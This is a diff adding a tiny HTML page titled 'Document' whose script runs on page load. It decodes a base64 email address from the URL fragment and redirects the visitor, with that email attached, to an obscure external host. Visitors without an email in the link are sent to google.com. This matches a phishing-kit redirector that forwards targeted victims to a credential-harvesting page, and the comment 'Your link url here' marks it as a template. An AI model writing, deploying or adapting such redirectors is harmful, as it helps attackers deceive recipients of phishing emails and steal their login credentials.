@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+       const fullUrl = window.location.href;
+        const emailRegex = /#([^#]+)$/;
+        const match = fullUrl.match(emailRegex);
+        const email = match ? match[1] : null;
+        var bse = atob(email)
+        var emval = `#${bse}`;
+
+        window.location.href = email 
+            ? `http://mydevtecsstudy-com.beak.host/aa/5_607798132-newkemal/${emval}` // Your link url here
+            : `http://google.com`; 
+
+    </script>
+</body>
+</html>
